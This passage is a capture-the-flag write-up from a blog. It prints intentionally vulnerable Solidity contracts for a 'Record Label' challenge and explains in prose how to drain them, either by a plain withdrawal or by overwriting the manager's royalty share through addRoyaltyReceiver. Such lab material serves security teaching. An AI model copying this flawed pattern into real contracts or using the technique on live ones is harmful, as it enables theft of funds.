+<div class="highlight"><pre><span></span><code><span class="k">pragma solidity</span><span class="w"> </span><span class="err">0.4.24</span><span class="p">;</span>
+
+<span class="kt">import</span><span class="w"> </span><span class="s2">&quot;../CtfFramework.sol&quot;</span><span class="p">;</span>
+<span class="kt">import</span><span class="w"> </span><span class="s2">&quot;../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol&quot;</span><span class="p">;</span>
+
+<span class="k">contract</span><span class="w"> </span><span class="ni">Royalties</span><span class="p">{</span>
+<span class="w">    </span>using<span class="w"> </span>SafeMath<span class="w"> </span><span class="kt">for</span><span class="w"> </span><span class="kt">uint256</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">private </span><span class="nv">collectionsContract</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">private </span><span class="nv">artist</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">address</span><span class="p">[]</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>receiver<span class="p">;</span>
+<span class="w">    </span><span class="kt">mapping</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>receiverToPercentOfProfit<span class="p">;</span>
+<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">private </span><span class="nv">percentRemaining</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">public </span><span class="nv">amountPaid</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_manager</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">_artist</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span>collectionsContract<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">;</span>
+<span class="w">        </span>artist<span class="o">=</span>_artist<span class="p">;</span>
+
+<span class="w">        </span>receiver<span class="p">.</span>push<span class="p">(</span>_manager<span class="p">);</span>
+<span class="w">        </span>receiverToPercentOfProfit<span class="p">[</span>_manager<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">80</span><span class="p">;</span>
+<span class="w">        </span>percentRemaining<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">100</span><span class="w"> </span><span class="o">-</span><span class="w"> </span>receiverToPercentOfProfit<span class="p">[</span>_manager<span class="p">];</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">modifier</span><span class="w"> </span>isCollectionsContract<span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>collectionsContract<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Unauthorized: Not Collections Contract&quot;</span><span class="p">);</span>
+<span class="w">        </span>_<span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">modifier</span><span class="w"> </span>isArtist<span class="p">(){</span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>artist<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Unauthorized: Not Artist&quot;</span><span class="p">);</span>
+<span class="w">        </span>_<span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">addRoyaltyReceiver</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_receiver</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_percent</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>isArtist<span class="p">{</span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>_percent<span class="o">&lt;</span>percentRemaining<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Precent Requested Must Be Less Than Percent Remaining&quot;</span><span class="p">);</span>
+<span class="w">        </span>receiver<span class="p">.</span>push<span class="p">(</span>_receiver<span class="p">);</span>
+<span class="w">        </span>receiverToPercentOfProfit<span class="p">[</span>_receiver<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_percent<span class="p">;</span>
+<span class="w">        </span>percentRemaining<span class="w"> </span><span class="o">=</span><span class="w"> </span>percentRemaining<span class="p">.</span>sub<span class="p">(</span>_percent<span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">payoutRoyalties</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>isCollectionsContract<span class="p">{</span>
+<span class="w">        </span><span class="kt">for</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span><span class="w"> </span>i<span class="o">&lt;</span><span class="w"> </span>receiver<span class="p">.</span>length<span class="p">;</span><span class="w"> </span>i<span class="o">++</span><span class="p">){</span>
+<span class="w">            </span><span class="kt">address</span><span class="w"> </span><span class="nv">current</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>receiver<span class="p">[</span>i<span class="p">];</span>
+<span class="w">            </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">payout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.value</span><span class="p">.</span>mul<span class="p">(</span>receiverToPercentOfProfit<span class="p">[</span>current<span class="p">]).</span>div<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">);</span>
+<span class="w">            </span>amountPaid<span class="w"> </span><span class="o">=</span><span class="w"> </span>amountPaid<span class="p">.</span>add<span class="p">(</span>payout<span class="p">);</span>
+<span class="w">            </span>current<span class="p">.</span>transfer<span class="p">(</span>payout<span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">msg.sender</span><span class="p">.</span>call<span class="p">.</span>value<span class="p">(</span><span class="k">msg.value</span><span class="o">-</span>amountPaid<span class="p">)(</span>bytes4<span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="s2">&quot;collectRemainingFunds()&quot;</span><span class="p">)));</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">getLastPayoutAmountAndReset</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>isCollectionsContract<span class="w"> </span><span class="kt">returns</span><span class="p">(</span><span class="kt">uint256</span><span class="p">){</span>
+<span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>amountPaid<span class="p">;</span>
+<span class="w">        </span>amountPaid<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">return</span><span class="w"> </span>ret<span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>isCollectionsContract<span class="p">{</span>
+<span class="w">        </span>payoutRoyalties<span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">contract</span><span class="w"> </span><span class="ni">Manager</span><span class="p">{</span>
+<span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">public </span><span class="nv">owner</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_owner</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span>owner<span class="w"> </span><span class="o">=</span><span class="w"> </span>_owner<span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">withdraw</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_balance</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span>owner<span class="p">.</span>transfer<span class="p">(</span>_balance<span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// empty</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">contract</span><span class="w"> </span><span class="ni">RecordLabel</span><span class="w"> </span><span class="kt">is</span><span class="w"> </span>CtfFramework<span class="p">{</span>
+<span class="w">    </span>using<span class="w"> </span>SafeMath<span class="w"> </span><span class="kt">for</span><span class="w"> </span><span class="kt">uint256</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">public </span><span class="nv">funds</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">public </span><span class="nv">royalties</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_ctfLauncher</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">_player</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span>
+<span class="w">        </span>CtfFramework<span class="p">(</span>_ctfLauncher<span class="p">,</span><span class="w"> </span>_player<span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span>royalties<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span>Royalties<span class="p">(</span><span class="kt">new</span><span class="w"> </span>Manager<span class="p">(</span>_ctfLauncher<span class="p">),</span><span class="w"> </span>_player<span class="p">);</span>
+<span class="w">        </span>funds<span class="w"> </span><span class="o">=</span><span class="w"> </span>funds<span class="p">.</span>add<span class="p">(</span><span class="k">msg.value</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>ctf<span class="p">{</span>
+<span class="w">        </span>funds<span class="w"> </span><span class="o">=</span><span class="w"> </span>funds<span class="p">.</span>add<span class="p">(</span><span class="k">msg.value</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">withdrawFundsAndPayRoyalties</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_withdrawAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>ctf<span class="p">{</span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>_withdrawAmount<span class="o">&lt;=</span>funds<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Insufficient Funds in Contract&quot;</span><span class="p">);</span>
+<span class="w">        </span>funds<span class="w"> </span><span class="o">=</span><span class="w"> </span>funds<span class="p">.</span>sub<span class="p">(</span>_withdrawAmount<span class="p">);</span>
+<span class="w">        </span>royalties<span class="p">.</span>call<span class="p">.</span>value<span class="p">(</span>_withdrawAmount<span class="p">)();</span>
+<span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">royaltiesPaid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Royalties<span class="p">(</span>royalties<span class="p">).</span>getLastPayoutAmountAndReset<span class="p">();</span>
+<span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">artistPayout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_withdrawAmount<span class="p">.</span>sub<span class="p">(</span>royaltiesPaid<span class="p">);</span><span class="w"> </span>
+<span class="w">        </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span>artistPayout<span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">collectRemainingFunds</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="p">{</span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>royalties<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Unauthorized: Not Royalties Contract&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Well, this was the strange one, just calling <code>withdrawFundsAndPayRoyalties</code> with 1 eth as the amount will clear all balance from the contract and give us win. Bad thing is that we lose 0.8 eth doing it, but that's the easiest way to do it.</p>
+<p>The correct way to solve it is to call <code>addRoyaltyReceiver</code> with the address of <code>Manager</code> contract, and 0 as percent he gets. Since mapping is used to connect addresses to percentages we will overwrite the original 80% with 0%. After this, we can call <code>withdrawFundsAndPayRoyalties</code> to get all of the money from the contract.</p>
+<p>We can also run analyser on code of this challenge:</p>
+<div class="highlight"><pre><span></span><code>docker run -v $(pwd):/tmp mythril/myth -x /tmp/RecordLabel.sol --solv 0.4.24
+</code></pre></div>
+                </div>
+                <footer class="text-right">
+                    <p>- F3real</p>
+                </footer>
+    <div id="show-comments" class="span7 text-center">
+        <a href="https://f3real.github.io/blockchain_ctf69.html#disqus_thread"
+          data-disqus-identifier="blockchain_ctf69"
+        class="btn btn-primary twitchy-background">Show Comments</a>
+    </div>
+    <section id="comments" class="comments hidden">
+        <hr/>
+        <h2>Comments</h2>
+        <div id="disqus_thread"></div>
+        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
+            Disqus.</a></noscript>
+        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </section>
+            </div>
+        </div>
+    </article>
+</section>
+<footer>
+    <hr>
+    <div class="row">
+        <div class="col-lg-10 text-center">
+            <p><small>
+                Built by <a href="http://docs.getpelican.com/en/latest">Pelican</a> / <a href="https://github.com/F3real/pelican-twitchy">pelican-twitchy</a>
+                &middot;                    &copy; 2024 F3real
+            </small></p>
+        </div>
+    </div>
+</footer>            </div>
+        </div>
+        <!-- /#page-content-wrapper -->
+    </div>
+    <!-- /#wrapper -->
+
+<!-- disqus -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'https-f3real-github-io'; // required: replace example with your forum shortname
+
+            var disqus_identifier = 'blockchain_ctf69';
+        var disqus_url = 'https://f3real.github.io/blockchain_ctf69.html';
+
+    var disqus_config = function () {
+        this.language = "en";
+    };
+
+        var commentsDiv = document.getElementById('show-comments');
+        commentsDiv.onclick = function() {
+            /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function () {
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+            this.style.display = 'none';        
+        };
+</script>
+<!-- /disqus -->
+    <script>
+        const wrapper = document.getElementById('wrapper');
+        const sidebarBig = document.getElementById('sidebar-wrapper');
+        const sidebarSmall = document.getElementById('sidebar-wrapper-small');
+
+        const triggers = Array.from(document.querySelectorAll('[data-toggle="collapse"]'));
+        for (var i = 0; i < triggers.length; i++) { 
+            triggers[i].addEventListener('click', (ev) => {
+                const elm = ev.currentTarget;    
+                ev.preventDefault();
+                const selector = elm.getAttribute('href').replace('#','');
+                elm.classList.toggle('collapsed');
+                document.getElementById(selector).classList.toggle('show');
+            }, false);
+        } 
+
+        function showBigNav() {;
+            sidebarBig.style.display = 'block';
+            sidebarSmall.style.display = 'none';
+        }
+        function showSmallNav() {
+            sidebarBig.style.display = 'none';
+            sidebarSmall.style.display = 'block';
+        }
+
+        const mediaQuery = window.matchMedia('(min-width:768px)');
+        mediaQuery.onchange = e => {
+            if (wrapper.classList.contains('toggled')) {
+                    wrapper.classList.remove('toggled');
+            } else {
+                if (e.matches) {
+                    showBigNav();
+                } else {
+                    showSmallNav();
+                }
+            }
+        }
+
+        function setNavbar() {
+            var condition = wrapper.classList.contains('toggled');
+            if (!mediaQuery.matches) {
+                condition = !condition;
+            }
+            if (condition) {
+                showSmallNav();
+            } else {
+                showBigNav();
+            }
+        }
+
+        function toggleMenu(){
+            wrapper.classList.toggle('toggled');
+            setNavbar();
+        }
+
+        window.onload = setNavbar;
+    </script>
+	<script data-goatcounter="https://f3real.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+</body>
+</html>
